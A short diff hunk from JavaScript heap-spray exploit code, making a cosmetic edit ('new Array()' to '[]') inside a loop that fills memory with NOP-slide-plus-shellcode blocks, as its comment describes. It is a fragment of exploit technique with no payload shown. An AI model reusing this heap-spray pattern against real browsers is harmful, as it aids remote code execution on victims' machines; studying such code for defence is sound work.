@@ -63,7 +63,7 @@
 
                                // We are going to create large blocks that will contain:
                                // [heap header][nopslide...........................][shellcode]
-                               memory = new Array();
+                               memory = [];
                                for (k = 0; k < heapBlocks; k++)
                                        memory[k] = spraySlide + ShellCode;
 
